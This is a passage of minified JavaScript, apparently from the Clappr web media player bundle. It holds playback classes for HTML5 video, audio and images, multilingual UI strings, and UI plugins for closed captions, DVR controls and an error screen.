t=this;this._updateSettingsCheckInFlight||(this._updateSettingsCheckInFlight=setTimeout((function(){t._updateSettings(),t._updateSettingsCheckInFlight=null}),1e3))}},{key:"_onTimeUpdate",value:function e(){var t=this.isLive?this.getDuration():this.el.duration;this.trigger(k.PLAYBACK_TIMEUPDATE,{current:this.el.currentTime,total:t},this.name)}},{key:"_onProgress",value:function e(){if(this.el.buffered.length){for(var t=[],r=0,n=0;n<this.el.buffered.length;n++)t=[].concat(Z(t),[{start:this.el.buffered.start(n),end:this.el.buffered.end(n)}]),this.el.currentTime>=t[n].start&&this.el.currentTime<=t[n].end&&(r=n);var i={start:t[r].start,current:t[r].end,total:this.el.duration};this.trigger(k.PLAYBACK_PROGRESS,i,t)}}},{key:"_typeFor",value:function e(t){var r=l._mimeTypesForUrl(t,Ur,this.options.mimeType);return 0===r.length&&(r=l._mimeTypesForUrl(t,jr,this.options.mimeType)),(r[0]||"").split(";")[0]}},{key:"_ready",value:function e(){this._isReadyState||(this._isReadyState=!0,this.trigger(k.PLAYBACK_READY,this.name))}},{key:"_checkForClosedCaptions",value:function e(){if(this.isHTML5Video&&!this._ccIsSetup){if(this.hasClosedCaptionsTracks){this.trigger(k.PLAYBACK_SUBTITLE_AVAILABLE);var t=this.closedCaptionsTrackId;this.closedCaptionsTrackId=t,this.handleTextTrackChange=this._handleTextTrackChange.bind(this),this.el.textTracks.addEventListener("change",this.handleTextTrackChange)}this._ccIsSetup=!0}}},{key:"_handleTextTrackChange",value:function e(){var r=this.closedCaptionsTracks.find((function(e){return"showing"===e.track.mode}))||{id:-1};this._ccTrackId!==r.id&&(this._ccTrackId=r.id,this.trigger(k.PLAYBACK_SUBTITLE_CHANGED,{id:r.id}))}},{key:"render",value:function e(){this.options.playback.disableContextMenu&&this.$el.on("contextmenu",(function(){return!1})),this._externalTracks&&this._externalTracks.length>0&&this.$el.html(this.template({tracks:this._externalTracks})),this._ready();var t=kr.getStyleFor("[data-html5-video] {\n  position: absolute;\n  height: 100%;\n  width: 100%;\n  display: block; }\n".toString(),{baseUrl:this.options.baseUrl});return this.$el.append(t[0]),this}},{key:"isReady",get:function e(){return this._isReadyState}},{key:"isHTML5Video",get:function e(){return this.name===l.prototype.name}},{key:"closedCaptionsTracks",get:function e(){var t=0,r=function e(){return t++};return(this.el.textTracks?Array.from(this.el.textTracks):[]).filter((function(e){return"subtitles"===e.kind||"captions"===e.kind})).map((function(e){return{id:r(),name:e.label,track:e}}))}},{key:"closedCaptionsTrackId",get:function e(){return this._ccTrackId},set:function e(t){if(Gt(t)){var n,r=this.closedCaptionsTracks;if(-1!==t){if(n=r.find((function(e){return e.id===t})),!n)return;if("showing"===n.track.mode)return}r.filter((function(e){return"hidden"!==e.track.mode})).forEach((function(e){return e.track.mode="hidden"})),n&&(n.track.mode="showing"),this._ccTrackId=t,this.trigger(k.PLAYBACK_SUBTITLE_CHANGED,{id:t})}}},{key:"template",get:function e(){return _(Fr)}}]),l}(S),Kr=(R._mimeTypesForUrl=function(e,t,r){var n=(e.split("?")[0].match(/.*\.(.*)$/)||[])[1],i=r||n&&t[n.toLowerCase()]||[];return i.constructor===Array?i:[i]},R._canPlay=function(e,t,r,n){var i=R._mimeTypesForUrl(r,t,n),a=document.createElement(e);return!!i.filter((function(e){return!!a.canPlayType(e).replace(/no/,"")}))[0]},R.canPlay=function(e,t){return R._canPlay("audio",jr,e,t)||R._canPlay("video",Ur,e,t)},function(e){d(r,e);var t=f(r);function r(){return u(this,r),t.apply(this,arguments)}return c(r,[{key:"updateSettings",value:function e(){this.settings.left=["playpause","position","duration"],this.settings.seekEnabled=this.isSeekEnabled(),this.trigger(k.PLAYBACK_SETTINGSUPDATE)}},{key:"getPlaybackType",value:function e(){return S.AOD}},{key:"name",get:function e(){return"html5_audio"}},{key:"supportedVersion",get:function e(){return{min:"0.4.19"}}},{key:"tagName",get:function e(){return"audio"}},{key:"isAudioOnly",get:function e(){return!0}}]),r}(R)),Yr=(Kr.canPlay=function(e,t){return R._canPlay("audio",{wav:["audio/wav"],mp3:["audio/mp3",'audio/mpeg;codecs="mp3"'],aac:['audio/mp4;codecs="mp4a.40.5"'],oga:["audio/ogg"]},e,t)},"[data-html-img] {\n  max-width: 100%;\n  max-height: 100%; }\n"),Hr=function(e){d(n,e);var r=f(n);function n(e){var t;return u(this,n),(t=r.call(this,e)).el.src=e.src,t}return c(n,[{key:"getPlaybackType",value:function e(){return S.NO_OP}},{key:"name",get:function e(){return"html_img"}},{key:"supportedVersion",get:function e(){return{min:"0.4.19"}}},{key:"tagName",get:function e(){return"img"}},{key:"attributes",get:function e(){return{"data-html-img":""}}},{key:"events",get:function e(){return{load:"_onLoad",abort:"_onError",error:"_onError"}}}]),c(n,[{key:"render",value:function e(){var t=kr.getStyleFor(Yr.toString(),{baseUrl:this.options.baseUrl});return this.$el.append(t[0]),this.trigger(k.PLAYBACK_READY,this.name),this}},{key:"_onLoad",value:function e(){this.trigger(k.PLAYBACK_ENDED,this.name)}},{key:"_onError",value:function e(t){var r="error"===t.type?"load error":"loading aborted";this.trigger(k.PLAYBACK_ERROR,{message:r},this.name)}}]),n}(S),zr=(Hr.canPlay=function(e){return/\.(png|jpg|jpeg|gif|bmp|tiff|pgm|pnm|webp)(|\?.*)$/i.test(e)},"<canvas data-no-op-canvas></canvas>\n<p data-no-op-msg><%=message%></p><p>\n</p>"),Wr=function(e){d(a,e);var i=f(a);function a(){var e;u(this,a);for(var t=arguments.length,r=new Array(t),n=0;n<t;n++)r[n]=arguments[n];return(e=i.call.apply(i,[this].concat(r)))._noiseFrameNum=-1,e}return c(a,[{key:"name",get:function e(){return"no_op"}},{key:"supportedVersion",get:function e(){return{min:"0.4.19"}}},{key:"template",get:function e(){return _(zr)}},{key:"attributes",get:function e(){return{"data-no-op":""}}}]),c(a,[{key:"render",value:function e(){var t=this.options.playbackNotSupportedMessage||this.i18n.t("playback_not_supported"),r=kr.getStyleFor("[data-no-op] {\n  position: absolute;\n  height: 100%;\n  width: 100%;\n  text-align: center; }\n\n[data-no-op] p[data-no-op-msg] {\n  position: absolute;\n  text-align: center;\n  font-size: 25px;\n  left: 0;\n  right: 0;\n  color: white;\n  padding: 10px;\n  /* center vertically */\n  top: 50%;\n  transform: translateY(-50%);\n  max-height: 100%;\n  overflow: auto; }\n\n[data-no-op] canvas[data-no-op-canvas] {\n  background-color: #777;\n  height: 100%;\n  width: 100%; }\n".toString(),{baseUrl:this.options.baseUrl});this.$el.append(r[0]),this.$el.html(this.template({message:t})),this.trigger(k.PLAYBACK_READY,this.name);var n=!(!this.options.poster||!this.options.poster.showForNoOp);return!this.options.autoPlay&&n||this._animate(),this}},{key:"_noise",value:function e(){if(this._noiseFrameNum=(this._noiseFrameNum+1)%5,!this._noiseFrameNum){var r,t=this.context.createImageData(this.context.canvas.width,this.context.canvas.height);try{r=new Uint32Array(t.data.buffer)}catch(e){r=new Uint32Array(this.context.canvas.width*this.context.canvas.height*4);for(var n=t.data,i=0;i<n.length;i++)r[i]=n[i]}for(var a=r.length,s=6*Math.random()+4,o=0,l=0,u=0;u<a;){if(o<0)o=s*Math.random(),l=255*Math.pow(Math.random(),.4)<<24;o-=1,r[u++]=l}this.context.putImageData(t,0,0)}}},{key:"_loop",value:function e(){var t=this;this._stop||(this._noise(),this._animationHandle=Dt((function(){return t._loop()})))}},{key:"destroy",value:function e(){this._animationHandle&&(Pt(this._animationHandle),this._stop=!0)}},{key:"_animate",value:function e(){this.canvas=this.$el.find("canvas[data-no-op-canvas]")[0],this.context=this.canvas.getContext("2d"),this._loop()}}]),a}(S),qr=(Wr.canPlay=function(e){return!0},function(e){d(n,e);var r=f(n);function n(e){var t;return u(this,n),(t=r.call(this,e))._initializeMessages(),t}return c(n,[{key:"name",get:function e(){return"strings"}},{key:"supportedVersion",get:function e(){return{min:"0.4.19"}}}]),c(n,[{key:"t",value:function e(t){var r=this._language(),n=this._messages.en;return(r&&this._messages[r]||n)[t]||n[t]||t}},{key:"_language",value:function e(){return this.core.options.language||Yt()}},{key:"_initializeMessages",value:function e(){this._messages=y.extend(!0,{en:{live:"live",back_to_live:"back to live",disabled:"Disabled",playback_not_supported:"Your browser does not support the playback of this video. Please try using a different browser.",default_error_title:"Could not play video.",default_error_message:"There was a problem trying to load the video."},de:{live:"Live",back_to_live:"Zurück zum Live-Video",disabled:"Deaktiviert",playback_not_supported:"Ihr Browser unterstützt das Playback Verfahren nicht. Bitte vesuchen Sie es mit einem anderen Browser.",default_error_title:"Video kann nicht abgespielt werden",default_error_message:"Es gab ein Problem beim Laden des Videos"},pt:{live:"ao vivo",back_to_live:"voltar para o ao vivo",disabled:"Desativado",playback_not_supported:"Seu navegador não supporta a reprodução deste video. Por favor, tente usar um navegador diferente.",default_error_title:"Não foi possível reproduzir o vídeo.",default_error_message:"Ocorreu um problema ao tentar carregar o vídeo."},es:{live:"vivo",back_to_live:"volver en vivo",disabled:"Discapacitado",playback_not_supported:"Su navegador no soporta la reproducción de un video. Por favor, trate de usar un navegador diferente."},ru:{live:"прямой эфир",back_to_live:"к прямому эфиру",disabled:"Отключено",playback_not_supported:"Ваш браузер не поддерживает воспроизведение этого видео. Пожалуйста, попробуйте другой браузер."},fr:{live:"en direct",back_to_live:"retour au direct",disabled:"Désactivé",playback_not_supported:"Votre navigateur ne supporte pas la lecture de cette vidéo. Merci de tenter sur un autre navigateur.",default_error_title:"Impossible de lire la vidéo.",default_error_message:"Un problème est survenu lors du chargement de la vidéo."},tr:{live:"canlı",back_to_live:"canlı yayına dön",disabled:"Engelli",playback_not_supported:"Tarayıcınız bu videoyu oynatma desteğine sahip değil. Lütfen farklı bir tarayıcı ile deneyin."},et:{live:"Otseülekanne",back_to_live:"Tagasi otseülekande juurde",disabled:"Keelatud",playback_not_supported:"Teie brauser ei toeta selle video taasesitust. Proovige kasutada muud brauserit."},ar:{live:"مباشر",back_to_live:"الرجوع إلى المباشر",disabled:"معطّل",playback_not_supported:"المتصفح الذي تستخدمه لا يدعم تشغيل هذا الفيديو. الرجاء إستخدام متصفح آخر.",default_error_title:"غير قادر الى التشغيل.",default_error_message:"حدثت مشكلة أثناء تحميل الفيديو."}},this.core.options.strings||{}),this._messages["de-DE"]=this._messages.de,this._messages["pt-BR"]=this._messages.pt,this._messages["en-US"]=this._messages.en,this._messages["es-419"]=this._messages.es,this._messages["fr-FR"]=this._messages.fr,this._messages["tr-TR"]=this._messages.tr,this._messages["et-EE"]=this._messages.et,this._messages["ar-IQ"]=this._messages.ar}}]),n}(l)),Xr=function(e){d(r,e);var t=f(r);function r(){return u(this,r),t.apply(this,arguments)}return c(r,[{key:"bindEvents",value:function e(){this.listenTo(this.core,k.CORE_CONTAINERS_CREATED,this.onContainersCreated)}},{key:"onContainersCreated",value:function e(){var t=this.core.containers.filter((function(e){return"no_op"!==e.playback.name}))[0]||this.core.containers[0];t&&this.core.containers.forEach((function(e){e!==t&&e.destroy()}))}},{key:"name",get:function e(){return"sources"}},{key:"supportedVersion",get:function e(){return{min:"0.4.19"}}}]),r}(l),Qr=(o.registerPlugin(qr),o.registerPlugin(Xr),o.registerPlayback(Wr),o.registerPlayback(Hr),o.registerPlayback(Kr),o.registerPlayback(R),{Player:Mr,Events:k,Browser:E,ContainerPlugin:a,UIContainerPlugin:C,CorePlugin:l,UICorePlugin:i,Playback:S,Container:Cr,Core:Lr,PlayerError:T,Loader:o,BaseObject:r,UIObject:Tr,Utils:t,HTML5Audio:Kr,HTML5Video:R,HTMLImg:Hr,Log:b,Styler:kr,version:"0.4.19",template:_,$:y});function w(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}function Jr(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}function O(e,t,r){return t&&Jr(e.prototype,t),r&&Jr(e,r),e}function L(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),t&&tn(e,t)}function en(e){return en=Object.setPrototypeOf?Object.getPrototypeOf:function e(t){return t.__proto__||Object.getPrototypeOf(t)},en(e)}function tn(e,t){return tn=Object.setPrototypeOf||function e(t,r){return t.__proto__=r,t},tn(e,t)}function an(e,t){return!t||"object"!=typeof t&&"function"!=typeof t?function nn(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}(e):t}function I(i){var a=function rn(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(e){return!1}}();return function e(){var r,t=en(i);if(a){var n=en(this).constructor;r=Reflect.construct(t,arguments,n)}else r=t.apply(this,arguments);return an(this,r)}}function on(e,t,r){return on="undefined"!=typeof Reflect&&Reflect.get?Reflect.get:function e(t,r,n){var i=function sn(e,t){for(;!Object.prototype.hasOwnProperty.call(e,t)&&null!==(e=en(e)););return e}(t,r);if(i){var a=Object.getOwnPropertyDescriptor(i,r);return a.get?a.get.call(n):a.value}},on(e,t,r||e)}var ln=function(e){L(r,e);var t=I(r);function r(e){return w(this,r),t.call(this,e)}return O(r,[{key:"name",get:function e(){return"click_to_pause"}},{key:"supportedVersion",get:function e(){return{min:"0.4.18"}}},{key:"bindEvents",value:function e(){this.listenTo(this.container,k.CONTAINER_CLICK,this.click),this.listenTo(this.container,k.CONTAINER_SETTINGSUPDATE,this.settingsUpdate)}},{key:"click",value:function e(){(this.container.getPlaybackType()!==S.LIVE||this.container.isDvrEnabled())&&(this.container.isPlaying()?this.container.pause():this.container.play())}},{key:"settingsUpdate",value:function e(){var t=this.container.getPlaybackType()!==S.LIVE||this.container.isDvrEnabled();if(t!==this.pointerEnabled){var r=t?"addClass":"removeClass";this.container.$el[r]("pointer-enabled"),this.pointerEnabled=t}}}]),r}(a);function dn(e,t){void 0===t&&(t={});var r=t.insertAt;if(e&&"undefined"!=typeof document){var n=document.head||document.getElementsByTagName("head")[0],i=document.createElement("style");i.type="text/css","top"===r&&n.firstChild?n.insertBefore(i,n.firstChild):n.appendChild(i),i.styleSheet?i.styleSheet.cssText=e:i.appendChild(document.createTextNode(e))}}var Rn,hn=(dn(".cc-controls[data-cc-controls] {\n  float: right;\n  position: relative;\n  display: none; }\n  .cc-controls[data-cc-controls].available {\n    display: block; }\n  .cc-controls[data-cc-controls] .cc-button {\n    padding: 6px !important; }\n    .cc-controls[data-cc-controls] .cc-button.enabled {\n      display: block;\n      opacity: 1.0; }\n      .cc-controls[data-cc-controls] .cc-button.enabled:hover {\n        opacity: 1.0;\n        text-shadow: none; }\n  .cc-controls[data-cc-controls] > ul {\n    list-style-type: none;\n    position: absolute;\n    bottom: 25px;\n    border: 1px solid black;\n    display: none;\n    background-color: #e6e6e6; }\n  .cc-controls[data-cc-controls] li {\n    font-size: 10px; }\n    .cc-controls[data-cc-controls] li[data-title] {\n      background-color: #c3c2c2;\n      padding: 5px; }\n    .cc-controls[data-cc-controls] li a {\n      color: #444;\n      padding: 2px 10px;\n      display: block;\n      text-decoration: none; }\n      .cc-controls[data-cc-controls] li a:hover {\n        background-color: #555;\n        color: white; }\n        .cc-controls[data-cc-controls] li a:hover a {\n          color: white;\n          text-decoration: none; }\n    .cc-controls[data-cc-controls] li.current a {\n      color: #f00; }\n"),function(e){L(i,e);var n=I(i);function i(e){var t;w(this,i),t=n.call(this,e);var r=e.options.closedCaptionsConfig;return t._title=r&&r.title?r.title:null,t._ariaLabel=r&&r.ariaLabel?r.ariaLabel:"cc-button",t._labelCb=r&&r.labelCallback&&"function"==typeof r.labelCallback?r.labelCallback:function(e){return e.name},t}return O(i,[{key:"name",get:function e(){return"closed_captions"}},{key:"supportedVersion",get:function e(){return{min:"0.4.18"}}},{key:"template",get:function e(){return _('<button type="button" class="cc-button media-control-button media-control-icon" data-cc-button aria-label="<%= ariaLabel %>"></button>\n<ul>\n  <% if (title) { %>\n  <li data-title><%= title %></li>\n  <% }; %>\n  <li><a href="#" data-cc-select="-1"><%= disabledLabel %></a></li>\n  <% for (var i = 0; i < tracks.length; i++) { %>\n    <li><a href="#" data-cc-select="<%= tracks[i].id %>"><%= tracks[i].label %></a></li>\n  <% }; %>\n</ul>\n')}},{key:"events",get:function e(){return{"click [data-cc-button]":"toggleContextMenu","click [data-cc-select]":"onTrackSelect"}}},{key:"attributes",get:function e(){return{class:"cc-controls","data-cc-controls":""}}},{key:"bindEvents",value:function e(){this.listenTo(this.core,k.CORE_ACTIVE_CONTAINER_CHANGED,this.containerChanged),this.listenTo(this.core.mediaControl,k.MEDIACONTROL_RENDERED,this.render),this.listenTo(this.core.mediaControl,k.MEDIACONTROL_HIDE,this.hideContextMenu),this.bindContainerEvents()}},{key:"bindContainerEvents",value:function e(){this.container=this.core.activeContainer,this.container&&(this.listenTo(this.container,k.CONTAINER_SUBTITLE_AVAILABLE,this.onSubtitleAvailable),this.listenTo(this.container,k.CONTAINER_SUBTITLE_CHANGED,this.onSubtitleChanged),this.listenTo(this.container,k.CONTAINER_STOP,this.onContainerStop))}},{key:"onContainerStop",value:function e(){this.ccAvailable(!1)}},{key:"containerChanged",value:function e(){this.ccAvailable(!1),this.stopListening(),this.bindEvents()}},{key:"onSubtitleAvailable",value:function e(){this.renderCcButton(),this.ccAvailable(!0)}},{key:"onSubtitleChanged",value:function e(t){this.setCurrentContextMenuElement(t.id)}},{key:"onTrackSelect",value:function e(t){var r=parseInt(t.target.dataset.ccSelect,10);return this.container.closedCaptionsTrackId=r,this.hideContextMenu(),t.stopPropagation(),!1}},{key:"ccAvailable",value:function e(t){var r=t?"addClass":"removeClass";this.$el[r]("available")}},{key:"toggleContextMenu",value:function e(){this.$el.find("ul").toggle()}},{key:"hideContextMenu",value:function e(){this.$el.find("ul").hide()}},{key:"contextMenuElement",value:function e(t){return this.$el.find("ul a"+(isNaN(t)?"":'[data-cc-select="'+t+'"]')).parent()}},{key:"setCurrentContextMenuElement",value:function e(t){if(this._trackId!==t){this.contextMenuElement().removeClass("current"),this.contextMenuElement(t).addClass("current");var r=t>-1?"addClass":"removeClass";this.$ccButton[r]("enabled"),this._trackId=t}}},{key:"renderCcButton",value:function e(){for(var t=this.container?this.container.closedCaptionsTracks:[],r=0;r<t.length;r++)t[r].label=this._labelCb(t[r]);this.$el.html(this.template({ariaLabel:this._ariaLabel,disabledLabel:this.core.i18n.t("disabled"),title:this._title,tracks:t})),this.$ccButton=this.$el.find("button.cc-button[data-cc-button]"),this.$ccButton.append('<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"\n\t viewBox="0 0 49 41.8" style="enable-background:new 0 0 49 41.8;" xml:space="preserve">\n<path d="M47.1,0H3.2C1.6,0,0,1.2,0,2.8v31.5C0,35.9,1.6,37,3.2,37h11.9l3.2,1.9l4.7,2.7c0.9,0.5,2-0.1,2-1.1V37h22.1\n\tc1.6,0,1.9-1.1,1.9-2.7V2.8C49,1.2,48.7,0,47.1,0z M7.2,18.6c0-4.8,3.5-9.3,9.9-9.3c4.8,0,7.1,2.7,7.1,2.7l-2.5,4\n\tc0,0-1.7-1.7-4.2-1.7c-2.8,0-4.3,2.1-4.3,4.3c0,2.1,1.5,4.4,4.5,4.4c2.5,0,4.9-2.1,4.9-2.1l2.2,4.2c0,0-2.7,2.9-7.6,2.9\n\tC10.8,27.9,7.2,23.5,7.2,18.6z M36.9,27.9c-6.4,0-9.9-4.4-9.9-9.3c0-4.8,3.5-9.3,9.9-9.3C41.7,9.3,44,12,44,12l-2.5,4\n\tc0,0-1.7-1.7-4.2-1.7c-2.8,0-4.3,2.1-4.3,4.3c0,2.1,1.5,4.4,4.5,4.4c2.5,0,4.9-2.1,4.9-2.1l2.2,4.2C44.5,25,41.9,27.9,36.9,27.9z"/>\n</svg>'),this.$el.append(this.style)}},{key:"render",value:function e(){this.renderCcButton();var t=this.core.mediaControl.$el.find("button[data-fullscreen]");return t[0]?this.$el.insertAfter(t):this.core.mediaControl.$el.find(".media-control-right-panel[data-media-control]").prepend(this.$el),this}}]),i}(i)),gn=(dn('.dvr-controls[data-dvr-controls] {\n  display: inline-block;\n  float: left;\n  color: #fff;\n  line-height: 32px;\n  font-size: 10px;\n  font-weight: bold;\n  margin-left: 6px; }\n  .dvr-controls[data-dvr-controls] .live-info {\n    cursor: default;\n    font-family: "Roboto", "Open Sans", Arial, sans-serif;\n    text-transform: uppercase; }\n    .dvr-controls[data-dvr-controls] .live-info:before {\n      content: "";\n      display: inline-block;\n      position: relative;\n      width: 7px;\n      height: 7px;\n      border-radius: 3.5px;\n      margin-right: 3.5px;\n      background-color: #ff0101; }\n    .dvr-controls[data-dvr-controls] .live-info.disabled {\n      opacity: 0.3; }\n      .dvr-controls[data-dvr-controls] .live-info.disabled:before {\n        background-color: #fff; }\n  .dvr-controls[data-dvr-controls] .live-button {\n    cursor: pointer;\n    outline: none;\n    display: none;\n    border: 0;\n    color: #fff;\n    background-color: transparent;\n    height: 32px;\n    padding: 0;\n    opacity: 0.7;\n    font-family: "Roboto", "Open Sans", Arial, sans-serif;\n    text-transform: uppercase;\n    transition: all 0.1s ease; }\n    .dvr-controls[data-dvr-controls] .live-button:before {\n      content: "";\n      display: inline-block;\n      position: relative;\n      width: 7px;\n      height: 7px;\n      border-radius: 3.5px;\n      margin-right: 3.5px;\n      background-color: #fff; }\n    .dvr-controls[data-dvr-controls] .live-button:hover {\n      opacity: 1;\n      text-shadow: rgba(255, 255, 255, 0.75) 0 0 5px; }\n\n.dvr .dvr-controls[data-dvr-controls] .live-info {\n  display: none; }\n\n.dvr .dvr-controls[data-dvr-controls] .live-button {\n  display: block; }\n\n.dvr.media-control.live[data-media-control] .media-control-layer[data-controls] .bar-container[data-seekbar] .bar-background[data-seekbar] .bar-fill-2[data-seekbar] {\n  background-color: #005aff; }\n\n.media-control.live[data-media-control] .media-control-layer[data-controls] .bar-container[data-seekbar] .bar-background[data-seekbar] .bar-fill-2[data-seekbar] {\n  background-color: #ff0101; }\n'),function(e){L(n,e);var r=I(n);function n(e){var t;return w(this,n),(t=r.call(this,e)).settingsUpdate(),t}return O(n,[{key:"template",get:function e(){return _('<div class="live-info"><%= live %></div>\n<button type="button" class="live-button" aria-label="<%= backToLive %>"><%= backToLive %></button>\n')}},{key:"name",get:function e(){return"dvr_controls"}},{key:"supportedVersion",get:function e(){return{min:"0.4.18"}}},{key:"events",get:function e(){return{"click .live-button":"click"}}},{key:"attributes",get:function e(){return{class:"dvr-controls","data-dvr-controls":""}}},{key:"bindEvents",value:function e(){this.bindCoreEvents(),this.bindContainerEvents()}},{key:"bindCoreEvents",value:function e(){var t=this;this.core.mediaControl.settings?(this.listenTo(this.core.mediaControl,k.MEDIACONTROL_CONTAINERCHANGED,this.containerChanged),this.listenTo(this.core.mediaControl,k.MEDIACONTROL_RENDERED,this.settingsUpdate),this.listenTo(this.core,k.CORE_OPTIONS_CHANGE,this.render)):setTimeout((function(){return t.bindCoreEvents()}),100)}},{key:"bindContainerEvents",value:function e(){this.core.activeContainer&&(this.listenToOnce(this.core.activeContainer,k.CONTAINER_TIMEUPDATE,this.render),this.listenTo(this.core.activeContainer,k.CONTAINER_PLAYBACKDVRSTATECHANGED,this.dvrChanged))}},{key:"containerChanged",value:function e(){this.stopListening(),this.bindEvents()}},{key:"dvrChanged",value:function e(t){this.core.getPlaybackType()===S.LIVE&&(this.settingsUpdate(),this.core.mediaControl.$el.addClass("live"),t?(this.core.mediaControl.$el.addClass("dvr"),this.core.mediaControl.$el.find(".media-control-indicator[data-position], .media-control-indicator[data-duration]").hide()):this.core.mediaControl.$el.removeClass("dvr"))}},{key:"click",value:function e(){var t=this.core.mediaControl,r=t.container;r.isPlaying()||r.play(),t.$el.hasClass("dvr")&&r.seek(r.getDuration())}},{key:"settingsUpdate",value:function e(){var t=this;this.stopListening(),this.core.mediaControl.$el.removeClass("live"),this.shouldRender()&&(this.render(),this.$el.click((function(){return t.click()}))),this.bindEvents()}},{key:"shouldRender",value:function e(){return(void 0===this.core.options.useDvrControls||!!this.core.options.useDvrControls)&&this.core.getPlaybackType()===S.LIVE}},{key:"render",value:function e(){return this.$el.html(this.template({live:this.core.i18n.t("live"),backToLive:this.core.i18n.t("back_to_live")})),this.shouldRender()&&(this.core.mediaControl.$el.addClass("live"),this.core.mediaControl.$(".media-control-left-panel[data-media-control]").append(this.$el)),this}}]),n}(i)),An=function(e){L(r,e);var t=I(r);function r(){return w(this,r),t.apply(this,arguments)}return O(r,[{key:"name",get:function e(){return"end_video"}},{key:"supportedVersion",get:function e(){return{min:"0.4.18"}}},{key:"bindEvents",value:function e(){this.listenTo(this.core,k.CORE_ACTIVE_CONTAINER_CHANGED,this.containerChanged);var t=this.core.activeContainer;t&&(this.listenTo(t,k.CONTAINER_ENDED,this.ended),this.listenTo(t,k.CONTAINER_STOP,this.ended))}},{key:"containerChanged",value:function e(){this.stopListening(),this.bindEvents()}},{key:"ended",value:function e(){(void 0===this.core.options.exitFullscreenOnEnd||this.core.options.exitFullscreenOnEnd)&&this.core.isFullscreen()&&this.core.toggleFullscreen()}}]),r}(l),bn=(dn("[data-player] .player-error-screen {\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n  color: #CCCACA;\n  position: absolute;\n  top: 0;\n  height: 100%;\n  width: 100%;\n  background-color: rgba(0, 0, 0, 0.7);\n  z-index: 2000;\n  display: flex;\n  flex-direction: column;\n  justify-content: center; }\n  [data-player] .player-error-screen__content[data-error-screen] {\n    font-size: 14px;\n    color: #CCCACA;\n    margin-top: 45px; }\n  [data-player] .player-error-screen__title[data-error-screen] {\n    font-weight: bold;\n    line-height: 30px;\n    font-size: 18px; }\n  [data-player] .player-error-screen__message[data-error-screen] {\n    width: 90%;\n    margin: 0 auto; }\n  [data-player] .player-error-screen__code[data-error-screen] {\n    font-size: 13px;\n    margin-top: 15px; }\n  [data-player] .player-error-screen__reload {\n    cursor: pointer;\n    width: 30px;\n    margin: 15px auto 0 !important; }\n"),function(e){L(n,e);var r=I(n);function n(e){var t;return w(this,n),(t=r.call(this,e)).options.disableErrorScreen?an(t,t.disable()):t}return O(n,[{key:"name",get:function e(){return"error_screen"}},{key:"supportedVersion",get:function e(){return{min:"0.4.18"}}},{key:"template",get:function e(){return _('<div class="player-error-screen__content" data-error-screen>\n  <% if (icon) { %>\n  <div class="player-error-screen__icon" data-error-screen><%= icon %></div>\n  <% } %>\n  <div class="player-error-screen__title" data-error-screen><%= title %></div>\n  <div class="player-error-screen__message" data-error-screen><%= message %></div>\n  <div class="player-error-screen__code" data-error-screen>Error code: <%= code %></div>\n  <div class="player-error-screen__reload" data-error-screen><%= reloadIcon %></div>\n</div>\n')}},{key:"container",get:function e(){return this.core.getCurrentContainer()}},{key:"attributes",get:function e(){return{class:"player-error-screen","data-error-screen":""}}},{key:"bindEvents",value:function e(){this.listenTo(this.core,k.ERROR,this.onError),this.listenTo(this.core,k.CORE_ACTIVE_CONTAINER_CHANGED,this.onContainerChanged)}},{key:"bindReload",value:function e(){this.reloadButton=this.$el.find(".player-error-screen__reload"),this.reloadButton&&this.reloadButton.on("click",this.reload.bind(this))}},{key:"reload",value:function e(){var t=this;this.listenToOnce(this.core,k.CORE_READY,(function(){return t.container.play()})),this.core.load(this.options.sources,this.options.mimeType),this.unbindReload()}},{key:"unbindReload",value:function e(){this.reloadButton&&this.reloadButton.off("click")}},{key:"onContainerChanged",value:function e(){this.err=null,this.unbindReload(),this.hide()}},{key:"onError",value:function e(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};t.level===T.Levels.FATAL&&(this.err=t,this.container.disableMediaControl(),this.container.stop(),this.show())}},{key:"show",value:function e(){this.render(),this.$el.show()}},{key:"hide",value:function e(){this.$el.hide()}},{key:"render",value:function e(){if(this.err)return this.$el.html(this.template({title:this.err.UI.title,message:this.err.UI.message,code:this.err.code,icon:this.err.UI.icon||"",reloadIcon:'<svg fill="#FFFFFF" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">\n    <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>\n    <path d="M0 0h24v24H0z" fill="none"/>\n</svg>'})),this.core.$el.append(this.el),this.bindReload(),this}}]),n}(i)),kn='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">\n  <path fill="#010101" d="M1.425.35L14.575 8l-13.15 7.65V.35z"/>\n</svg>',_n='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">\n  <path fill-rule="evenodd" clip-rule="evenodd" fill="#010101" d="M1.712 14.76H6.43V1.24H1.71v13.52zm7.86-13.52v13.52h4.716V1.24H9.573z"/>\n</svg>',Tn=y('link[rel="shortcut icon"]'),Sn=function(e){L(n,e);var r=I(n);function n(e){var t;return w(this,n),(t=r.call(this,e))._container=null,t.configure(),t}return O(n,[{key:"name",get:function e(){return"favicon"}},{key:"supportedVersion",get:function e(){return{min:"0.4.18"}}},{key:"oldIcon",get:function e(){return Tn}},{key:"configure",value:function 